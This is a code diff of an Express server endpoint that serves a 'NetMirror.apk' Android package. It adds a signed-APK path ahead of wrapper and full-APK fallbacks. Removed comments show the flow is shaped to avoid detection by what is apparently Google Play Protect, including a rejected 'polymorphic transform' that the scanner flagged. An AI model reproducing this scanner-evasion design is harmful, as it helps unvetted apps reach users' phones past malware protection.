@@ -720,29 +720,44 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     try {
       // Track download start
       try { trackEvent('download_start', { ip_address: req.ip || '', user_agent: req.get('user-agent') || '' }); } catch (_) {}
-      // MUST serve wrapper APK — never fall back to full APK (PP blocks it)
+
+      // ═══ PRIORITY 1: Deployed signed APK from APK Signer vault ═══
+      try {
+        const deployedRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'deployed_signed_apk_id'").get();
+        if (deployedRow && deployedRow.value) {
+          const deployedId = deployedRow.value;
+          const signedPath = path.join(__dirname, 'data', 'signed_apks', `${deployedId}_signed.apk`);
+          if (fs.existsSync(signedPath)) {
+            const apkBuf = fs.readFileSync(signedPath);
+            console.log(`[DL] Serving DEPLOYED signed APK ${deployedId} (${(apkBuf.length / 1048576).toFixed(2)} MB)`);
+            res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+            res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
+            res.setHeader('Content-Length', apkBuf.length);
+            res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+            res.setHeader('Pragma', 'no-cache');
+            return res.end(apkBuf);
+          }
+        }
+      } catch (_) {}
+
+      // ═══ PRIORITY 2: Wrapper APK (legacy flow) ═══
       let wrapperBuf = getWrapperApkBuffer();
       if (!wrapperBuf) {
-        // Wrapper not on disk yet (Railway ephemeral storage). Try auto-fetch now.
         console.log('[DL] Wrapper not on disk — triggering auto-fetch from GitHub Releases...');
         await ensureWrapperFromGitHub();
         wrapperBuf = getWrapperApkBuffer();
       }
       if (wrapperBuf) {
-        // Serve the wrapper AS-IS (signed with real apksigner V2+V3).
-        // Do NOT apply polymorphic transform — it replaces the proper V2+V3
-        // signing with node-forge V1+V2 which PP detects as suspicious.
         console.log(`[DL] Serving wrapper APK as-is (${(wrapperBuf.length / 1048576).toFixed(2)} MB, apksigner-signed)`);
-        const serveBuf = wrapperBuf;
         res.setHeader('Content-Type', 'application/vnd.android.package-archive');
         res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
-        res.setHeader('Content-Length', serveBuf.length);
+        res.setHeader('Content-Length', wrapperBuf.length);
         res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
         res.setHeader('Pragma', 'no-cache');
-        return res.end(serveBuf);
+        return res.end(wrapperBuf);
       }
-      // No wrapper available — fall back to serving the FULL APK instead of returning JSON error.
-      // A JSON error response causes Chrome to save "NetMirror.apk.json" which confuses the user.
+
+      // ═══ PRIORITY 3: Full APK fallback ═══
       console.warn('[DL] No wrapper APK available — falling back to full APK');
       try {
         const apkBuf = await getApkBuffer();
@@ -755,7 +770,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
           return res.end(apkBuf);
         }
       } catch (_) {}
-      // Absolute last resort — return a plain text error, NOT JSON (prevents .apk.json filename)
+
       res.setHeader('Content-Type', 'text/plain');
       res.status(503).send('App is being prepared. Please try again in 30 seconds.');
     } catch (err) {
